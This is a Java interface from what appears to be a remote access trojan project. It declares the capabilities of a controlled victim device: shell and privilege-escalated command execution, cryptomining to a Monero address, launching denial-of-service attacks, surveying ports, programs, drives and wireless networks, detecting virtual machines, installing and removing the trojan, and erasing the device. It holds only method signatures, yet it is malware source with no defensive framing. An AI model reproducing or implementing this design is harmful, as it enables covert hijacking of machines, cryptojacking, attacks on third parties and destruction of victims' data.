package io.github.machineswillrise.websocketrat.client.devices;

import java.net.InetAddress;

import java.util.List;
import java.util.Map;

public interface Device
{
	String getOperatingSystem();
	String getBIOSVendor();
	String getBIOSVersion();
	boolean isVirtualMachine();

	ShellExecution executeCommand(String... command);
	ShellExecution executeEscalatedCommand(String... command);

	void startCryptomining(String moneroAddress);
	double getHashRate();
	void stopCryptomining();

	void startDOS(InetAddress address);
	void stopDOS();

	int getCPUUsage();
	int getRAMUsage();
	int getThreadUsage();

	List<Integer> getOpenPorts();
	List<String> getConnectedHardDrives();
	Map<String, String> getInstalledPrograms();

	int getBatteryPercentage() throws MissingPeripheralException;
	int getScreenBrightness() throws MissingPeripheralException;
	int getSpeakerVolume() throws MissingPeripheralException;
	int getMicrophoneVolume() throws MissingPeripheralException;

	List<String> getBluetoothDevices() throws MissingPeripheralException;
	List<Map<String, String>> getWifiNetworks() throws MissingPeripheralException;

	void installRat();
	void uninstallRat();
	void erase();
}
